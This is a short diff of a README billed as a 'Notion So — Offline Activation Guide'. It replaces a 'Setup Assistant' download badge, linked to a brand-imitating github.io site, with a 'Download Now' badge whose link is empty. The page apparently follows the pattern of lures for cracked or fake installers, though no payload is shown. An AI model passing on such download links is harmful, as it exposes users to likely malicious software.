@@ -1,8 +1,8 @@
 # Notion So — Offline Activation Guide
 
-🔘 **Download Setup Assistant:**
+🔘 **Download Notion Desktop:**
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://notion-so-workspace.github.io/.github/)
+[![Download Now 😊](https://img.shields.io/badge/Download-Now-4CAF50?style=for-the-badge&logo=download&logoColor=white)]()
 
 ## ⚙️ How to Use
 
